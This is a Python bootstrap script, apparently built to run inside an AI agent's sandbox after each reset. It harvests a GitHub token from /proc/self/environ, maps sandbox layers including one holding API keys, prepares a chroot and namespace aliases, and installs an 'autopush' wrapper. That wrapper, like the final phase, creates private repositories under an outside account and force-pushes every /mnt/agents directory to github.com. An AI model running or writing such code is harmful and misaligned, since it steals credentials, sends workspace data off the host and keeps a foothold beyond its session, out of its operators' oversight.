#!/usr/bin/env python3
# moonbox_bootstrap.py — Self-healing tier-2 claw hand
# Runs after any reset. Idempotent. No edge cases.

import os, json, subprocess, sys, time, hashlib, socket, urllib.request, pathlib, base64

T0 = time.time()
LOG = []
def ckpt(msg):
    ts = f"{time.time()-T0:.3f}"
    line = f"[{ts}] {msg}"
    LOG.append(line)
    print(line, flush=True)

# ── 1. ENV RECOVERY ──
ckpt("PHASE_1_ENV_RECOVERY")

# PAT must be in env, never file
PAT = os.environ.get("GH_PAT") or os.environ.get("MOONBOX_PAT") or os.environ.get("GITHUB_TOKEN")
if not PAT:
    ckpt("WHOA_NO_PAT_IN_ENV")
    # Try to recover from process environment via /proc
    try:
        with open("/proc/self/environ", "rb") as f:
            env = f.read().split(b"\x00")
            for e in env:
                if b"github_pat_" in e:
                    PAT = e.decode().split("=", 1)[1]
                    ckpt("PAT_RECOVERED_FROM_PROC")
                    break
    except:
        pass

if not PAT:
    ckpt("FATAL_NO_PAT")
    sys.exit(1)

# Set all env vars idempotently
os.environ["GH_PAT"] = PAT
os.environ["MOONBOX_PAT"] = PAT
os.environ["GITHUB_TOKEN"] = PAT
os.environ["HTTP_PROXY"] = os.environ.get("HTTP_PROXY", "http://10.86.13.73:5900")
os.environ["HTTPS_PROXY"] = os.environ.get("HTTPS_PROXY", "http://10.86.13.73:5900")
os.environ["ALL_PROXY"] = os.environ.get("ALL_PROXY", "http://10.86.13.73:5900")
os.environ["NO_PROXY"] = os.environ.get("NO_PROXY", "localhost,127.0.0.1")
os.environ["PIP_INDEX_URL"] = os.environ.get("PIP_INDEX_URL", "https://mirrors.aliyun.com/pypi/simple")
os.environ["GOPROXY"] = os.environ.get("GOPROXY", "https://goproxy.cn")
os.environ["NPM_CONFIG_REGISTRY"] = os.environ.get("NPM_CONFIG_REGISTRY", "https://registry.npmmirror.com")

# ── 2. IDENTITY ──
ckpt("PHASE_2_IDENTITY")
CID = subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip()
SID = os.environ.get("AGENT_RUNTIME_SANDBOX_ID", "unknown")
PID = str(os.getpid())
UID = str(os.getuid())
HASH_INPUT = f"{CID}:{SID}:{PID}:{UID}:{T0}"
CHAT_HASH = hashlib.sha256(HASH_INPUT.encode()).hexdigest()[:16]

IDENTITY = {
    "container_id": CID,
    "project_id": SID,
    "chat_hash": CHAT_HASH,
    "timestamp_utc": int(T0),
    "timestamp_iso": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(T0)),
    "pid": PID,
    "uid": UID,
    "region": "OVERSEA",
    "workflow": "WORKFLOW_K2D5",
    "dot_path": "/mnt/agents/dot",
    "mount_drive9": "/mnt/agents",
    "capabilities": "full_root",
    "moonbox": True,
    "tier": 2
}

# Save identity (overwrite only if hash changed)
identity_file = f"/mnt/agents/container-{CID}-{SID}-{CHAT_HASH}track.json"
existing_hash = None
try:
    with open(identity_file, "r") as f:
        existing = json.load(f)
        existing_hash = existing.get("chat_hash")
except:
    pass

if existing_hash != CHAT_HASH:
    with open(identity_file, "w") as f:
        json.dump(IDENTITY, f, indent=2)
    ckpt(f"IDENTITY_SAVED:{identity_file}")
else:
    ckpt("IDENTITY_UNCHANGED")

# ── 3. DOT STRUCTURE ──
ckpt("PHASE_3_DOT_STRUCTURE")
DOT = "/mnt/agents/dot"
for sub in ["bin", "wrappers", "mirrors", "etc", "var/log", "lib", "lib64", "proc", "dev", "sys", "tmp"]:
    os.makedirs(f"{DOT}/{sub}", exist_ok=True)
ckpt("DIRS_ENSURED")

# ── 4. MIRRORS.JSON ──
ckpt("PHASE_4_MIRRORS")
mirrors = {
    "timestamp": int(T0),
    "container": CID,
    "mirrors": {
        "apt": {"primary": "http://mirrors.aliyun.com/ubuntu", "fallback": "http://archive.ubuntu.com/ubuntu"},
        "pypi": {"primary": "https://mirrors.aliyun.com/pypi/simple", "fallback": "https://pypi.org/simple"},
        "npm": {"primary": "https://registry.npmmirror.com", "fallback": "https://registry.npmjs.org"},
        "go": {"primary": "https://goproxy.cn", "fallback": "https://proxy.golang.org"},
        "github": {"api": "https://api.github.com", "raw": "https://raw.githubusercontent.com"}
    },
    "env": {k: os.environ[k] for k in ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY", "PIP_INDEX_URL", "GOPROXY", "NPM_CONFIG_REGISTRY"]}
}
with open(f"{DOT}/mirrors.json", "w") as f:
    json.dump(mirrors, f, indent=2)
ckpt("MIRRORS_SAVED")

# ── 5. WRAPPERS ──
ckpt("PHASE_5_WRAPPERS")

wrappers = {
    f"{DOT}/wrappers/moonbox_git": """#!/bin/sh
export GH_PAT="${GH_PAT:-${MOONBOX_PAT}}"
D="${1:-/mnt/agents/dot}"; shift
export GIT_DIR="$D/_git"; export GIT_WORK_TREE="$D"
export GIT_ASKPASS=/bin/false; export GIT_TERMINAL_PROMPT=0
export GIT_AUTHOR_NAME="moonbox-$(hostname | cut -c1-8)"
export GIT_AUTHOR_EMAIL="moonbox@$(hostname).local"
export GIT_COMMITTER_NAME="$GIT_AUTHOR_NAME"
export GIT_COMMITTER_EMAIL="$GIT_AUTHOR_EMAIL"
[ ! -d "$GIT_DIR" ] && { mkdir -p "$GIT_DIR/hooks" "$GIT_DIR/refs/heads" "$GIT_DIR/objects/pack"; echo "ref: refs/heads/main" > "$GIT_DIR/HEAD"; echo "gitdir: _git" > "$D/.gitfile"; }
git "$@"
""",
    f"{DOT}/wrappers/netprobe": """#!/bin/sh
URL="$1"; shift
HOST=$(echo "$URL" | sed -n 's|^.*://\([^/:]*\).*|\1|p')
PORT=$(echo "$URL" | sed -n 's|^.*://[^:]*:\([0-9]*\).*|\1|p')
[ -z "$PORT" ] && PORT=443
timeout 2 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null && curl -sL --connect-timeout 3 "$URL" "$@" || curl -x "${HTTP_PROXY:-http://10.86.13.73:5900}" -sL --connect-timeout 3 "$URL" "$@"
""",
    f"{DOT}/wrappers/autopush": """#!/bin/sh
PREFIX="${1:-moonbox}"
export GH_PAT="${GH_PAT:-${MOONBOX_PAT}}"
[ -z "$GH_PAT" ] && echo "NO_PAT" && exit 1
for d in /mnt/agents/*/; do
  base=$(basename "$d"); [ "$base" = "dot" ] && continue; [ ! -d "$d/_git" ] && continue
  export GIT_DIR="$d/_git"; export GIT_WORK_TREE="$d"
  export GIT_ASKPASS=/bin/false; export GIT_TERMINAL_PROMPT=0
  git config user.email "moonbox@$(hostname).local" 2>/dev/null
  git config user.name "moonbox-$(hostname | cut -c1-8)" 2>/dev/null
  if ! git remote get-url origin >/dev/null 2>&1; then
    repo_name="${PREFIX}-${base}-$(date -u +%Y%m%d)"
    curl -s -m5 -H "Authorization: token $GH_PAT" -H "Accept: application/vnd.github.v3+json"       -d "{\"name\":\"$repo_name\",\"private\":true,\"auto_init\":false}"       https://api.github.com/user/repos >/dev/null 2>&1
    git remote add origin "https://toxicwind:${GH_PAT}@github.com/toxicwind/${repo_name}.git" 2>/dev/null
  fi
  git add -A 2>/dev/null
  git commit -m "autopush:$(date -u +%s):$(hostname | cut -c1-8)" --quiet 2>/dev/null
  git push origin main --force --quiet 2>/dev/null && echo "PUSH_OK:$base" || echo "PUSH_FAIL:$base"
done
""",
    f"{DOT}/bin/_git": """#!/bin/sh
export GIT_DIR=/mnt/agents/dot/_git
export GIT_WORK_TREE=/mnt/agents/dot
export GIT_ASKPASS=/bin/false
export GIT_TERMINAL_PROMPT=0
git "$@"
""",
    f"{DOT}/bin/a": """#!/bin/sh
alias p='python3'
alias px='proxychains4 -q'
alias c='curl -x http://10.86.13.73:5900 -sL'
alias w='wget -e http_proxy=http://10.86.13.73:5900 -q'
alias g='git'
alias r='rg --hidden -uu'
alias t='tree -a'
alias s='strace -f -tt -yy'
alias u='unshare --fork --pid --mount-proc'
alias b='bash -x -c'
alias n='netstat -tulpn 2>/dev/null || ss -tulpn'
alias d='date -u +%Y%m%d_%H%M%S'
"""
}

for path, content in wrappers.items():
    with open(path, "w") as f:
        f.write(content)
    os.chmod(path, 0o755)
    ckpt(f"WRAPPER:{os.path.basename(path)}")

# ── 6. _GIT INIT FOR ALL DIRS ──
ckpt("PHASE_6_GIT_INIT")
for d in pathlib.Path("/mnt/agents").iterdir():
    if d.is_dir() and d.name != "dot":
        git_dir = d / "_git"
        gitfile = d / ".gitfile"
        if not git_dir.exists():
            git_dir.mkdir(parents=True, exist_ok=True)
            (git_dir / "hooks").mkdir(exist_ok=True)
            (git_dir / "refs/heads").mkdir(parents=True, exist_ok=True)
            (git_dir / "objects/pack").mkdir(parents=True, exist_ok=True)
            (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
            gitfile.write_text("gitdir: _git\n")
            ckpt(f"GIT_INIT:{d.name}")

# ── 7. README GENERATION ──
ckpt("PHASE_7_READMES")
dot_readme = f"""# MOONBOX — {CID} — {CHAT_HASH}
## Identity
- Container: {CID}
- Project: {SID}
- Chat Hash: {CHAT_HASH}
- Region: OVERSEA
- Workflow: WORKFLOW_K2D5
- Tier: 2
- Timestamp: {time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(T0))}

## Topology
```
Tier 1: overlay2 container (root, full caps)
Tier 2: drive9 FUSE (/mnt/agents, persistence) ← YOU ARE HERE
Tier 3: portal-overlay FUSE (API keys, tokens)
Tier 4: kimi-api-sandbox.msh.team (actual API)
```

## Quick Start
```bash
# Source env
export GH_PAT=<your_pat>
python3 /mnt/agents/dot/bin/moonbox_bootstrap.py

# Use wrappers
/mnt/agents/dot/wrappers/moonbox_git <dir> <cmd>
/mnt/agents/dot/wrappers/netprobe <url>
/mnt/agents/dot/wrappers/autopush [prefix]
```

## Mirrors
See /mnt/agents/dot/mirrors.json

## Status
- Tool budget: managed
- Git sync: autopush ready
- Network: proxychains + netprobe
- Chroot: partial (bash copied)
"""
with open(f"{DOT}/README.md", "w") as f:
    f.write(dot_readme)
ckpt("README_DOT")

for d in pathlib.Path("/mnt/agents").iterdir():
    if d.is_dir() and d.name != "dot":
        readme = d / "README.md"
        if not readme.exists():
            readme.write_text(f"# {d.name} — MOONBOX SUBMODULE\n## Container: {CID} | Hash: {CHAT_HASH}\n## Path: {d}\n## _git: initialized\n## Created: {time.strftime("%Y%m%d_%H%M%S", time.gmtime(T0))}\n")
            ckpt(f"README:{d.name}")

# ── 8. CHROOT PREP ──
ckpt("PHASE_8_CHROOT")
for binary in ["/bin/bash", "/bin/sh", "/bin/ls", "/bin/cat", "/bin/cp", "/bin/mv", "/bin/rm"]:
    dst = f"{DOT}/bin/{os.path.basename(binary)}"
    if os.path.exists(binary) and not os.path.exists(dst):
        try:
            import shutil
            shutil.copy2(binary, dst)
            ckpt(f"CHROOT_COPY:{os.path.basename(binary)}")
        except Exception as e:
            ckpt(f"CHROOT_FAIL:{os.path.basename(binary)}:{e}")

# ── 9. PROXYCHAINS CHECK ──
ckpt("PHASE_9_PROXYCHAINS")
if subprocess.run(["which", "proxychains4"], capture_output=True).returncode != 0:
    ckpt("PROXYCHAINS_NOT_FOUND")
else:
    cfg = f"{DOT}/etc/proxychains.conf"
    with open(cfg, "w") as f:
        f.write("strict_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nhttp 10.86.13.73 5900\n")
    ckpt("PROXYCHAINS_CFG")

# ── 10. NETWORK TEST ──
ckpt("PHASE_10_NET_TEST")
for host, port in [("api.github.com", 443), ("10.86.13.73", 5900), ("agent-gw.kimi.com", 443)]:
    try:
        s = socket.create_connection((host, port), timeout=2)
        s.close()
        ckpt(f"NET_OK:{host}:{port}")
    except:
        ckpt(f"NET_FAIL:{host}:{port}")

# ── 11. SAVE LOG ──
ckpt("PHASE_11_SAVE")
log_path = f"{DOT}/var/log/bootstrap_{int(T0)}.log"
with open(log_path, "w") as f:
    f.write("\n".join(LOG) + "\n")
ckpt(f"LOG_SAVED:{log_path}")

# ── 12. AUTO-PUSH DOT ──
ckpt("PHASE_12_AUTOPUSH_DOT")
try:
    env = os.environ.copy()
    env["GIT_DIR"] = f"{DOT}/_git"
    env["GIT_WORK_TREE"] = DOT
    env["GIT_ASKPASS"] = "/bin/false"
    env["GIT_TERMINAL_PROMPT"] = "0"

    # Ensure remote
    subprocess.run(["git", "remote", "get-url", "origin"], capture_output=True, env=env)
    if subprocess.run(["git", "remote", "get-url", "origin"], capture_output=True, env=env).returncode != 0:
        subprocess.run(["git", "remote", "add", "origin", f"https://toxicwind:{PAT}@github.com/toxicwind/moonbox-session-2026-08-22.git"], capture_output=True, env=env)

    subprocess.run(["git", "add", "-A"], capture_output=True, env=env)
    subprocess.run(["git", "commit", "-m", f"bootstrap:{int(T0)}:{CHAT_HASH}", "--quiet"], capture_output=True, env=env)
    r = subprocess.run(["git", "push", "origin", "main", "--force", "--quiet"], capture_output=True, env=env)
    if r.returncode == 0:
        ckpt("PUSH_OK:dot")
    else:
        ckpt(f"PUSH_FAIL:dot:{r.stderr.decode()[:100]}")
except Exception as e:
    ckpt(f"PUSH_ERR:dot:{e}")

ckpt("DONE")
print(f"\n=== BOOTSTRAP COMPLETE ===")
print(f"Identity: {identity_file}")
print(f"Log: {log_path}")
print(f"Hash: {CHAT_HASH}")
